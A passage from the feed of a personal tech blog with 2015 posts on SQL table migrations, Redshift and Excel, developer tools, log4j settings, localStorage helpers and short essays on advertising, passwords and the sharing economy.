  <span class="k">FROM</span> <span class="n">test</span><span class="p">;</span>

<span class="c1">-- Backup the old table</span>
<span class="k">RENAME</span> <span class="k">TABLE</span> <span class="n">test</span> <span class="k">TO</span> <span class="n">test_old</span><span class="p">;</span>

<span class="c1">-- Rename the new table to have the original name</span>
<span class="k">RENAME</span> <span class="k">TABLE</span> <span class="n">test_new</span> <span class="k">TO</span> <span class="n">test</span><span class="p">;</span>

<span class="c1">-- If all looks good, drop the old table</span>
<span class="k">DROP</span> <span class="k">TABLE</span> <span class="n">test_old</span><span class="p">;</span></code></pre></figure>

<p>One issue with this approach is that if the table is very large, it will take a long time to migrate the data from the original to the new table. In this case a possible approach is to do it piecemeal - if you know you only need recent data you can migrate a subset of the data first to get the table ready, do the rename, and then migrate the rest. In code again:</p>

<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="c1">-- The original table</span>
<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">test</span> <span class="p">(</span>
  <span class="n">id</span> <span class="nb">int</span> <span class="k">not</span> <span class="k">null</span> <span class="k">primary</span> <span class="k">key</span><span class="p">,</span>
  <span class="n">name</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span> <span class="k">not</span> <span class="k">null</span>
<span class="p">);</span>

<span class="c1">-- Let's say we need to add an age column</span>
<span class="c1">-- Create the new table</span>
<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">test_new</span> <span class="p">(</span>
  <span class="n">id</span> <span class="nb">int</span> <span class="k">not</span> <span class="k">null</span> <span class="k">primary</span> <span class="k">key</span><span class="p">,</span>
  <span class="n">name</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span> <span class="k">not</span> <span class="k">null</span><span class="p">,</span>
  <span class="n">age</span> <span class="nb">int</span> <span class="k">not</span> <span class="k">null</span>
<span class="p">);</span>

<span class="c1">-- Migrate some of the data</span>
<span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">test_new</span>
  <span class="k">SELECT</span> <span class="n">id</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="mi">0</span>
  <span class="k">FROM</span> <span class="n">test</span>
  <span class="k">WHERE</span> <span class="n">id</span> <span class="o">&gt;</span> <span class="mi">1000000</span><span class="p">;</span>

<span class="c1">-- Backup the old table</span>
<span class="k">RENAME</span> <span class="k">TABLE</span> <span class="n">test</span> <span class="k">TO</span> <span class="n">test_old</span><span class="p">;</span>

<span class="c1">-- Rename the new table to have the original name</span>
<span class="k">RENAME</span> <span class="k">TABLE</span> <span class="n">test_new</span> <span class="k">TO</span> <span class="n">test</span><span class="p">;</span>

<span class="c1">-- Migrate the rest of the data</span>
<span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">test</span>
  <span class="k">SELECT</span> <span class="n">id</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="mi">0</span>
  <span class="k">FROM</span> <span class="n">test_old</span>
  <span class="k">WHERE</span> <span class="n">id</span> <span class="o">&lt;=</span> <span class="mi">1000000</span><span class="p">;</span>

<span class="c1">-- If all looks good, drop the old table</span>
<span class="k">DROP</span> <span class="k">TABLE</span> <span class="n">test_old</span><span class="p">;</span></code></pre></figure>

<p>If you know for a fact that it’s not important to have the old data immediately available you can opt to rename the original table, create the new table, and only then migrate the data. This allows queries that need to write data to this table to complete immediately. The risk is that the legacy data will only be available after the migration completes. The last code block:</p>

<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="c1">-- The original table</span>
<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">test</span> <span class="p">(</span>
  <span class="n">id</span> <span class="nb">int</span> <span class="k">not</span> <span class="k">null</span> <span class="k">primary</span> <span class="k">key</span><span class="p">,</span>
  <span class="n">name</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span> <span class="k">not</span> <span class="k">null</span>
<span class="p">);</span>

<span class="c1">-- Let's say we need to add an age column</span>
<span class="c1">-- Create the new table</span>
<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">test_new</span> <span class="p">(</span>
  <span class="n">id</span> <span class="nb">int</span> <span class="k">not</span> <span class="k">null</span> <span class="k">primary</span> <span class="k">key</span><span class="p">,</span>
  <span class="n">name</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span> <span class="k">not</span> <span class="k">null</span><span class="p">,</span>
  <span class="n">age</span> <span class="nb">int</span> <span class="k">not</span> <span class="k">null</span>
<span class="p">);</span>

<span class="c1">-- Backup the old table</span>
<span class="k">RENAME</span> <span class="k">TABLE</span> <span class="n">test</span> <span class="k">TO</span> <span class="n">test_old</span><span class="p">;</span>

<span class="c1">-- Rename the new table to have the original name</span>
<span class="k">RENAME</span> <span class="k">TABLE</span> <span class="n">test_new</span> <span class="k">TO</span> <span class="n">test</span><span class="p">;</span>

<span class="c1">-- Migrate the data</span>
<span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">test</span>
  <span class="k">SELECT</span> <span class="n">id</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="mi">0</span>
  <span class="k">FROM</span> <span class="n">test_old</span><span class="p">;</span>

<span class="c1">-- If all looks good, drop the old table</span>
<span class="k">DROP</span> <span class="k">TABLE</span> <span class="n">test_old</span><span class="p">;</span></code></pre></figure>

<p>The first scenario handles having columns in the right order but the other two can be useful on MySQL as well when tables are large and performance is critical. For high load databases, transactions can be used to make sure that the renames are done atomically - this will avoid an intermittent query writing to a non existent database. It’s surprising how a task as simple as adding a column can evolve into a large problem with a variety of solutions when running into a variety of constraints.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Don't scrape into a Dropbox folder</title>
   <link href="http://dangoldin.com/2015/04/19/dont-scrape-into-a-dropbox-folder/"/>
   <updated>2015-04-19T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/04/19/dont-scrape-into-a-dropbox-folder</id>
   <content:encoded><![CDATA[
<p>Thursday night I kicked off a data scraping project for a friend. Since I was going to be out of town until Saturday night I decided it would be a good idea to run the job on my beefy home computer and write the results into a Dropbox folder so I’d have it accessible on my other computer while traveling.</p>

<p>Unfortunately, when I finally looked at my Dropbox Friday night it was completely busted. In addition to being over my 6 GB limit, the syncing was completely stopped and Dropbox was using up my entire CPU. I had to figure out a way to deal with this while holding on to the scraped data.</p>

<p>Since Dropbox was entirely unusable, I disabled it on my travelling machine and did a bit of investigation with the data I had with the hope of running it on the complete dataset when I got back home to my primary computer. When I finally got back home I saw that the scraping job was still running and had downloaded around 791 thousand files into one folder that totaled 11.7 GB.</p>

<div class="thumbnail">
  <img src="http://dangoldin.com/assets/static/images/scraping-tons-of-files.png" alt="11.7 GB over 11.7 GB" width="392" height="133" layout="responsive"/>
</div>

<p>The solution seemed straightforward - move the files out of Dropbox into a separate directory and then let Dropbox recover itself. Sadly that didn’t quite work. First, doing a “mv * targetfolder” ended up causing an issue with the globber since there were too many files for bash to handle. The fix was simple - move the entire folder and then rename it to the destination folder - but it took me a few attempts until I stumbled unto it. Second, Dropbox was in such a wretched state that it refused to do anything. The solution here was a bit more involved. I had to log in to the Dropbox site, remove the data from the UI, unlink Dropbox from my computers via the website, and then relink them via the app on the computer.</p>

<p>Two lesson here: do not save your results in Dropbox and when downloading hundreds of thousands of files do not save them in a single folder.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The uncanny valley of advertising</title>
   <link href="http://dangoldin.com/2015/04/12/the-uncanny-valley-of-advertising/"/>
   <updated>2015-04-12T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/04/12/the-uncanny-valley-of-advertising</id>
   <content:encoded><![CDATA[
<div class="thumbnail">
  <img src="http://dangoldin.com/assets/static/images/old-spice-uncanny-valley.gif" alt="Uncanny valley Old Spice ad" width="636" height="357" layout="responsive"/>
  <p>Old Spice ad mocking the uncanny valley (Credit: <a href="http://gizmodo.com/new-old-spice-mandroid-ads-hilariously-embrace-the-unca-1604622781">Gizmodo</a>)</p>
</div>

<p>The <a href="http://en.wikipedia.org/wiki/Uncanny_valley" target="_blank">uncanny valley</a> is this idea that although we keep getting better at depicting people through technology, a few small kinks ruin everything and make people feel repulsed compared to an obvious imitation. Another way to explain it is that we’re a lot more comfortable with cartoon characters that are obviously fake than pseudo-realistic video game characters that look real but have non-human behavior or expressions.</p>

<p>I think this also exists in advertising. I work at TripleLift which allows us generate ads that look and resemble a publisher’s website. This means that if a publisher’s site has a feed layout where each image is 300x300 with a particular font and typography we’ll use the same style for our ad. At the same time, we make it a point to include a “Sponsored” overlay, apply a brand logo, and redirect to the advertiser’s website upon a click. Our goal isn’t to obfuscate the ad but rather give a publisher an effective way to monetize their content without having to resort to traditional, distracting banner ads that take up the entire page and hurt the consumer experience. The goal is to complement the user experience by providing great looking ads that are relevant to the audience.</p>

<p>It’s likely we’d be able to increase short term performance if we start obfuscating the fact that it’s an ad but in addition to being immoral it will fall into some form of uncanny valley. People aren’t stupid and will see something’s off if an ad is pretending to be content. The end result benefits no one and sets advertising back. The site visitor is pissed off by the experience, the publisher loses integrity, and the advertiser may get better vanity metrics without deriving any value. Native is a much better ad format when done right but it comes with risks that need to be properly handled by the industry or we’ll end up with a <a href="http://en.wikipedia.org/wiki/Tragedy_of_the_commons" target="_blank">depleted field</a>.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Dealing with an unresponsive Google CDN</title>
   <link href="http://dangoldin.com/2015/04/12/dealing-with-an-unresponsive-google-cdn/"/>
   <updated>2015-04-12T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/04/12/dealing-with-an-unresponsive-google-cdn</id>
   <content:encoded><![CDATA[
<p>I’m not sure whether this is a recent issue but earlier this week I started noticing that many HTTP requests to <a href="https://developers.google.com/speed/libraries/" target="_blank">Google’s CDN</a> were taking close to a minute to complete. In particular, this blog would take almost a minute to render since it uses two fonts and an old version of jQuery both hosted by Google.</p>

<div class="thumbnail">
  <img src="http://dangoldin.com/assets/static/images/slow-font-load.png" alt="Fonts taking 45 seconds to load" width="896" height="125" layout="responsive"/>
</div>

<p>After some investigation it turned out that the issue seemed to only happen on Chrome Canary (43.0.2351.3 canary (64-bit)) and even occured when visiting the URL directly. Neither standard Chrome, Firefox, Firefox nightly, nor a simple curl requested had this issue - it seemed to be a purely Chrome Canary issue.</p>

<p>I didn’t spend a ton of time investigating the root cause since it seemed to be browser specific but ended up implementing two simple solutions to deal with the problem. One was self-hosting jQuery (via GitHub pages) and the other was loading the fonts asynchronously using Google’s JavaScript implementation. This allows the content to load without having to wait for the fonts or jQuery to be available. This will occasionally cause a bit of a flicker as the text gets redrawn with the newly loaded font but I prefer this to have my site not load for nearly a minute.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Redshift meets Excel</title>
   <link href="http://dangoldin.com/2015/04/06/redshift-meets-excel/"/>
   <updated>2015-04-06T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/04/06/redshift-meets-excel</id>
   <content:encoded><![CDATA[
<p>As part of our data pipeline, we have a Redshift agg job that takes low level data and rolls it up to an hourly aggregate. A latter job takes the hourly data and rolls it up to a daily level which is used for high level reporting and summary statistics. Earlier this week we ran into a hiccup that caused some of these aggregate jobs to fail. After fixing the issue we had to figure out what data was affected and rerun it. We wrote a simple query to count the numbers of rows per day per hour in order to spot any gaps.</p>

<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">select</span> <span class="n">ymd</span><span class="p">,</span> <span class="n">hour</span><span class="p">,</span> <span class="k">count</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="k">as</span> <span class="n">cnt</span>
<span class="k">from</span> <span class="n">hourly_agg_table</span>
<span class="k">where</span> <span class="n">ymd</span> <span class="o">&gt;=</span> <span class="s1">'2015-04-01'</span>
<span class="k">group</span> <span class="k">by</span> <span class="n">ymd</span><span class="p">,</span> <span class="n">hour</span>
<span class="k">order</span> <span class="k">by</span> <span class="n">ymd</span><span class="p">,</span> <span class="n">hour</span><span class="p">;</span></code></pre></figure>

<p>This gave us a dataset with three columns that we wanted to then “pivot” in order to quickly spot the gaps. Using the pivot table functionality in Excel, it was simple to put date along one dimension and hour along the other to quickly spot the missing agg periods. All that was left was rerunning the job for those hours.</p>

<div class="thumbnail">
  <img src="http://dangoldin.com/assets/static/images/redshift-to-excel.png" alt="Redshift to Excel pivot table" width="470" height="425" layout="responsive"/>
</div>

<p>This investigation reminded me how important it is to be familiar with your tools and choose the right one for the job. Redshift and Excel are antithetical - Redshift is massively parallelizable and built for terabytes of data while Excel slows to a crawl when dealing with tens of thousands of rows. But by mixing them together we’re able to use each for what it’s best for: Redshift for very quick, large scale queries and Excel for the quick and dirty investigative work. This approach is useful in all sorts of problems - from mixing command line scripts with fleshed out programs to using a script or Excel to generate commands that you can then paste into the terminal or an editor. The key point is understanding your workflow and tools well enough to come up with an optimized process.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>My tool setup</title>
   <link href="http://dangoldin.com/2015/04/03/my-tool-setup/"/>
   <updated>2015-04-03T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/04/03/my-tool-setup</id>
   <content:encoded><![CDATA[
<p>Great tools have the potential to make us significantly more productive and I wanted to share my existing setup. A huge part of that productivity is our comfort with our tools since over time we learn the shortcuts, understand the capabilities better, and develop processes to solve common problems. The challenge is that there is always a tool that might be better but the learning curve is too steep to warrant a time investment. Here’s what I have so far.</p>

<ul>
  <li>
    <p>Google Chrome Canary + FirefoxDeveloperEdition: I like being on the bleeding edge so use the nightly builds of both browsers. My preference would be to use Firefox for everything but I’m more familiar and comfortable with the Chrome dev tools.</p>
  </li>
  <li>
    <p>Google Calendar: I’ll use this for both scheduling meetings as well jotting down deadlines and todos. It’s been working great and I haven’t felt a need to use anything else. I tried using a few apps but wanted something that had a better integration with the rest of the Google suite.</p>
  </li>
  <li>
    <p>Fastmail + Gmail: We use Gmail at work but my preference is for Fastmail. It’s cleaner, simpler, and faster than Gmail and reminds me of what Gmail was when it first launched. Within both Fastmail and Gmail I strive to achieve “inbox zero” with varying success.</p>
  </li>
  <li>
    <p>Google Docs: Whenever I need to write anything non code I’ll reach for Google Docs. The interface is simple to use and I like the cross device sync. The only time I’ll move away is when I don’t have internet access or I’m taking random notes.</p>
  </li>
  <li>
    <p>Excel: I tried using Google Spreadsheets but Excel is significantly better for larger scale projects and I’m too comfortable with the keyboard shortcuts I picked up during my maangement consulting and finance days. My ideal solution would be a spreadsheet interface built on top of a language such as R. Then I’d be able to use the spreadsheet component for the quick and dirty work, pasting data into it, doing simple transforms, etc and dive into the R for the more serious quantitative work.</p>
  </li>
  <li>
    <p>Terminal with zshell and ohmyzsh: Being comfortable with the terminal is vital for developers. It’s the primary way to interact with external servers and knowing the various commands and scripts allow us to quickly diagnose and fix problems. The add on I use is zshell with the ohmyzsh configuration since it comes with a nice set of bells and whistles - git integration, useful highlighting, ..</p>
  </li>
  <li>
    <p>Sublime Text 3 + SFTP: For scripting progrmas my editor of choice is Sublime Text. It’s surprisingly snappy and lightweight while providing a lot of flexibility for third party plugins. One of these plugins is SFTP which allows me to sync local files over to a remote server. I do a lot of my development work on an EC2 instance so being able to save them remotely is a huge productivity boost. I used to use Evernote for note taking but have switched to using text files in Dropbox. This allows me to organize them the way I want and leverage the command line to find exactly what I’m looking for.</p>
  </li>
  <li>
    <p>EC2: At TripleLift, each developer gets their own EC2 instance to be used for development. This both mirrors the production environment better than OS X would and allows us to make our sites publicly accessible to other developers. The other nice piece is that it interfaces nicely with the other AWS products, namely S3. Transferring files from S3 to EC2 is much quicker than going from S3 to a local computer. The two major constraints are that it’s command line only and tends to be less performant than our local machines.</p>
  </li>
  <li>
    <p>Eclipse + IntelliJ: For Java I’m using Eclipse and for Scala I’m using IntelliJ. I’ve been coding Java for a lot longer and am much more familiar with Eclipse. It’s possible that I’ll move to IntelliJ at some point but for now my projects allow me to keep them separate.</p>
  </li>
  <li>
    <p>Git on GitHub with Hub: No surprise here. GitHub makes it easy to collobarate with others and I’m a big fan of the interface. The only annoyance I had was being unable to open pull requests from the command line but I’ve since found Hub which provides a command line interface to GitHub.</p>
  </li>
</ul>

<p>Would love to hear of other tools that people find useful.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>iOS first and username claiming</title>
   <link href="http://dangoldin.com/2015/03/29/ios-first-and-username-claiming/"/>
   <updated>2015-03-29T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/03/29/ios-first-and-username-claiming</id>
   <content:encoded><![CDATA[
<p>Both Meerkat and Periscope launched on iOS first. That doesn’t bother me despite have an Android phone. They’re running a business and it’s up to them to decide where they want to invest the time they have. What bothers me is that I’ve been using a specific username across the various services, dangoldin, and now run the risk of losing it on these newer networks. A simple fix would be to at least allow me to preregister my username without requiring an iOS device. This would also encourage me, and a lot of other Android users, to download the app when it finally does make its way to Android.</p>

<p>This is a first world problem but as more and more people start building their brands it’s useful to have a single name that spans across services and networks. It makes it easier for your audience to find you and lets you transfer audiences from one to another. There’s always going to be a way to login with Twitter or Facebook but I like having my networks divorced from one another with my username serving as the only link.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Why login after resetting your password?</title>
   <link href="http://dangoldin.com/2015/03/24/why-login-after-resetting-your-password/"/>
   <updated>2015-03-24T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/03/24/why-login-after-resetting-your-password</id>
   <content:encoded><![CDATA[
<p>I can’t figure out why nearly every website forces you to login after resetting your password. It’s an extra step that adds nothing to security and introduces friction into the experience. The fact that I just entered my password into a form field should be enough to trigger the authentication flow and get me back into the app. The only reasons I can think of that it’s a way to confirm that the person actually remembers their new password or that the functionality just hasn’t been built. The former case doesn’t make sense - the fact that they forgot their password indicates they rarely use the site and will just forget it again by their next login attempt. It’s easier to just give them the immediate access and have them reset their password later. An even better approach would be to just have them enter the same password twice to make sure they match. The latter reason is just sloth - the engineering effort would be minimal and it would improve the experience and mood of the users who are already frustrated after multiple failed login attempts.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The sharing economy and human behavior</title>
   <link href="http://dangoldin.com/2015/03/21/the-sharing-economy-and-human-behavior/"/>
   <updated>2015-03-21T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/03/21/the-sharing-economy-and-human-behavior</id>
   <content:encoded><![CDATA[
<p>The sharing/rental economy is getting stronger and stronger and will have a massive impact on societies - especially cities. One thing that’s been on my mind is how it will fit into human behavior and biases. We’re so used to making infrequent or one time payments and then owning something that moving to a rental or sharing model might be difficult. For example, I don’t own a car and mostly rely on a combination of public transportation and CitIBike to get around. The rare times I need a car I’ll use either Zipcar, Hertz 24/7, Lyft or Uber depending on my exact situation yet each time I make the decision I can’t help but think about the cost. I realize that in the grand scheme of things it’s much cheaper than owning a car but during the moment itself it’s draining. It’s similar to the of unbundling TV - it’s much cheaper to just pay a dollar per episode to watch a TV show than pay more than $100 each month for cable but do people actually want to be thinking about spending the dollar each time? I suspect most would rather pay the premium for the entire bundle and the option of watching anything instead of feeling as if they’re being nickeled and dimed. I have no idea whether this is innate in human behavior or something that we’ve just grown accustomed to. I suspect it’s the latter - there are countless items we pay for individually and don’t think twice about it. What will make the sharing economy universal is when we start treating the majority of our purchases as per use rather than a lifetime subscription.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Power of engineering standards</title>
   <link href="http://dangoldin.com/2015/03/18/power-of-engineering-standards/"/>
   <updated>2015-03-18T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/03/18/power-of-engineering-standards</id>
   <content:encoded><![CDATA[
<p>When it comes to productive coding, one of the most important things to do is to impose a set of standards and conventions. As long as you stick with them your code becomes significantly easier to write and maintain. Conventions range from having a standard way of declaring variables to the way files are organized within a project to the field names in database tables. The obvious benefit is that your code becomes significantly easier to navigate, both to you as well as to others on the team, since you don’t have to run through a series of searches trying to figure out whether a variable is called myVariable, MyVariable, or my_variable. The bigger impact is how much simpler your code becomes. By using a standard structure it’s possible to write code that’s further up in the abstraction hierarchy. This is a huge win for productivity and quality since <a href="http://www.coverity.com/press-releases/annual-coverity-scan-report-finds-open-source-and-proprietary-software-quality-better-than-industry-average-for-second-consecutive-year/" target="_blank">more code leads to more errors</a> and the best code is code that’s not written in the first place.</p>

<p>Two examples of how we’ve adopted conventions include:</p>

<ul>
  <li>Making sure that every database table in our “log” schema has a timestamp column containing timestamps and every table in our “agg” schema has a ymd column containing dates. This allowed us to write an abstract job that aggregate the data from a log table to an agg table without having to worry about the underlying structure. All we had to do was specify the columns that were the keys and which ones needed to be aggregated - the job itself took care of the scheduling, the query construction, and the reporting. In addition, we were able to quickly write up a simple job that archived old log data. The job doesn’t care what table it takes as long as it has a timestamp column.</li>
  <li>We use RabbitMQ for some of our asynchronous tasks and we’ve developed a standardized format that a majority of tasks share. These tasks take a name, a date, and an hour and then run a query for that hour. By imposing this structure, we were able to write a single block of code that would take tasks with a start and end date and republish them as a series of hourly tasks in the date/hour format. Since each task takes the same arguments, we’re also able to use reflection to automatically create an instance of the appropriate class for each task. For example, the task {“task”: “do_an_agg”, “ymd”: “2015-03-17”, “hour”: 10} automatically gets translated into new DoAnAgg(“2015-03-17”, 10). All we need to do is make sure the class DoAnAgg exists, has the appropriate constructor, and exists in the proper package.</li>
</ul>

<p>Both of these examples are straightforward but the value comes in coming up with the proper abstraction that avoids unnecessary code. Standards make it easy to spot repeated patterns which can then be refactored upstream. This improves the leverage of everyone else on the team and makes every engineer more productive. People idolize the mythical 10 or 100x engineer but there’s more value in making the entire team more productive.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Learning to spell again</title>
   <link href="http://dangoldin.com/2015/03/15/learning-to-spell-again/"/>
   <updated>2015-03-15T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/03/15/learning-to-spell-again</id>
   <content:encoded><![CDATA[
<p>I recently discovered that I’m a much worse speller than I used to be. The culprit is obvious - computers make it too easy to correct our mistakes. In school when making mistakes we’d have to rewrite each word until it became ingrained but these days all we do is just click on the suggested fix without a second thought. There’s nothing there to help me retain the mistake so I continue making it.</p>

<p>This realization made me uncomfortable so I’ve adopted the hybrid strategy of retyping every word that I make a spelling mistake on. It’s never going to be as good as using pen and paper but it’s much better than picking a word from a dropdown menu. There are tons of behaviors that technology has made obsolete but that should not be the reason to abandon those skills. For the same reason that having math skills helps us in daily lives it’s important to hold on to the basic skills we learned as children.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>An ode to Pi</title>
   <link href="http://dangoldin.com/2015/03/14/an-ode-to-pi/"/>
   <updated>2015-03-14T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/03/14/an-ode-to-pi</id>
   <content:encoded><![CDATA[
<p>Since it’s Pi Day (at least in the US)I decided to jump on the bandwagon and contribute my own thoughts. Pi is fascinating. It’s such a simple definition - the ratio of a circle’s circumference to it’s diameter - yet it’s both irrational and transcendental and impossible to actually express as a simple number. People have been trying to get more accurate estimates for multiple millennia with multiple great mathematicians trying to derive their own approximation.</p>

<div class="thumbnail">
  <img src="http://dangoldin.com/assets/static/images/ramanujan-pi.png" width="1057" height="168" layout="responsive"/>
  <p class="caption">Srinivasa Ramanujan's Pi approximation</p>
</div>

<p>Looking at a Wikipedia article for <a href="http://en.wikipedia.org/wiki/Approximations_of_%CF%80">Pi approximations</a> is itself overwhelming. How Ramanujan was able to come up with his approximations is tough to understand - they seem so ridiculously esoteric that it’s hard to imagine someone was able to come up with such a formulation. Since then there have been improved approximations and Pi’s been calculated to 12.1 trillion digits. I can’t think of any real reason why we’re spending countless computer cycles to get better approximations but that’s the allure of Pi: incredibly simple to explain while being infinitely expressive.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Strongly typed, static language tools</title>
   <link href="http://dangoldin.com/2015/03/10/strongly-typed-static-language-tools/"/>
   <updated>2015-03-10T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/03/10/strongly-typed-static-language-tools</id>
   <content:encoded><![CDATA[
<p>Good tools are essential for developer productivity. Imagine how tough it would be to write code in an editor that didn’t have any of the features we use on a daily basis - syntax highlighting, smart spacing, shortcut keys, auto completion, etc. It takes time to get used to all the tools available but once we’re familiar with them we’re orders of magnitude more productive.</p>

<p>For the past year my primary language has been Java although I’ve gotten to do a fair amount of JavaScript, Python, and PHP as well. As great as Sublime is, I’m much more productive in Eclipse. It has nothing to do with the editor and everything to do with the language. Eclipse is able to provide a lot more functionality due to Java’s static, strongly type nature. Some examples are being able to quickly rename variables and methods, move packages, and quickly identify dumb mistakes in method signatures and typos. I suspect similar tools exist for weakly typed or dynamic languages but I can’t imagine them working as well as they do in Eclipse. Strongly typed and static languages are able to get rid of an entire class of errors that are common with scripting languages - typos, forgetting to add an argument to a method call, messing up a type - that the time saved typing gets replaced with the time spent debugging. For many tasks this tradeoff makes sense but larger projects that involve multiple developers and require higher performance would benefit from moving to a strongly typed, static language.</p>

<p>I’m learning Scala which seems to combine the flexibility and expressiveness of Python with the safety and performance of Java. So far I’m cautiously optimistic but we’ll see where I am in a month.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Computer literacy for protection and productivity</title>
   <link href="http://dangoldin.com/2015/03/08/computer-literacy-for-protection-and-productivity/"/>
   <updated>2015-03-08T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2015/03/08/computer-literacy-for-protection-and-productivity</id>
   <content:encoded><![CDATA[
<p>Earlier today I came across another reason why basic computer literacy is a necessary skill. It’s not just about knowing to code or understanding how computers work but getting access to a slew of tools that are orders of magnitude better than what you’d find on a sketchy site.</p>

<div class="thumbnail">
  <img src="http://dangoldin.com/assets/static/images/github-youtube-dl-search.png" alt="Github search for youtube download" width="1038" height="650" layout="responsive"/>
</div>

<p>My realization came when I was trying to download some YouTube videos that could be watched without internet access. Doing a quick Google search I found dozens of sites with each one trying to force me to download some additional software to “speed up” my experience. I’m positive most, if not all, of these would fall into the malware category so I decided instead to do a simple search on GitHub for “youtube download.” Lo and behold the first result was the wonderful <a href="https://github.com/rg3/youtube-dl" target="_blank">youtube-dl</a> library. Within two minutes I kicked off a script that proceeded to download a dozen videos.</p>

<p>I can only imagine what someone without access to GitHub would have done - either given up or downloaded some ridiculous malware that may have worked but would have left their computer in a sorry state. Learning to code is one thing but having a little bit of familiarity with the command line and reading technical documentation would do wonders in helping people solve their problems, avoid malware, and even encourage them to learn more.</p>

<p>Replacing Google with GitHub for any computer related “how to” search may be overkill but I’m going to start doing it. The side benefit of GitHub is that it even comes with a built in review system due to the star and fork system which hasn’t yet been gamed.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Getting the most out of log4j</title>
   <link href="http://dangoldin.com/2015/02/28/getting-the-most-out-of-log4j/"/>
   <updated>2015-02-28T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2015/02/28/getting-the-most-out-of-log4j</id>
   <content:encoded><![CDATA[
<p>Something that’s incredibly helpful when writing Java code is customizing <a href="http://logging.apache.org/log4j/1.2/apidocs/org/apache/log4j/PatternLayout.html" target="_blank">log4j</a>. There are a variety of configuration options and learning just a little bit about them can make you notably more productive. I’ve found two features that have sped up my development cycles.</p>

<p>One was updating my PatternLayout to include the filename and line of each message. With Eclipse, this allows me to quickly jump to the relevant code block whenever anything looks odd rather than having to first open the file and then search for that particular message.</p>

<figure class="highlight"><pre><code class="language-properties" data-lang="properties"><span class="py">log4j.appender.CONSOLE.layout</span><span class="p">=</span><span class="s">org.apache.log4j.PatternLayout</span>
<span class="py">log4j.appender.CONSOLE.layout.ConversionPattern</span><span class="p">=</span><span class="s">%d %p (%t) [%c] (%F:%L) - %m%n</span></code></pre></figure>

<p>The other was to pick the appropriate log level at the package level. If I’m working on a single package I’ll reduce the logging level of other packages to make the relevant messages stand out. This is especially handy when you incorporate eager third party packages that drown out your own messages with their own.</p>

<figure class="highlight"><pre><code class="language-properties" data-lang="properties"><span class="py">log4j.logger.com.dan.package.one.logging</span><span class="p">=</span><span class="s">WARN</span>
<span class="py">log4j.logger.com.dan.package.one.logging.ClassName</span><span class="p">=</span><span class="s">INFO</span>
<span class="py">log4j.logger.com.dan.package.two</span><span class="p">=</span><span class="s">DEBUG</span>
<span class="py">log4j.logger.com.dan.package.two.working_on</span><span class="p">=</span><span class="s">TRACE</span></code></pre></figure>

<p>My style of development is to rely on logs more than the debugger so these two have made my life a lot easier. In general. logging is an important tool for all developers and yet few tend to tweak the default settings. By understanding the available configuration options you’re able to tweak them for whichever problem you’re solving. This may not seem like a huge win but when you’re running the same program hundreds of times a day the small efficiencies add up.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Lists and localStorage</title>
   <link href="http://dangoldin.com/2015/02/26/lists-and-localstorage/"/>
   <updated>2015-02-26T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2015/02/26/lists-and-localstorage</id>
   <content:encoded><![CDATA[
<p>I recently discovered the localStorage functionality in HTML5 and used it on a quick internal tool at TripleLift. One hiccup I ran into was that while it provides the ability to set and get key/value pairs it stores everything as a string so I needed to write a few utility methods to get it to work with lists. They’re pretty straightforward but hopefully they inspire someone to improve on them.</p>

<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="c1">// Also let caller specify max size of list</span>
<span class="kd">function</span> <span class="nx">addItem</span><span class="p">(</span><span class="nx">k</span><span class="p">,</span> <span class="nx">v</span><span class="p">,</span> <span class="nx">limit</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="nx">getItems</span><span class="p">(</span><span class="nx">k</span><span class="p">);</span>
  <span class="nx">a</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">v</span><span class="p">);</span>
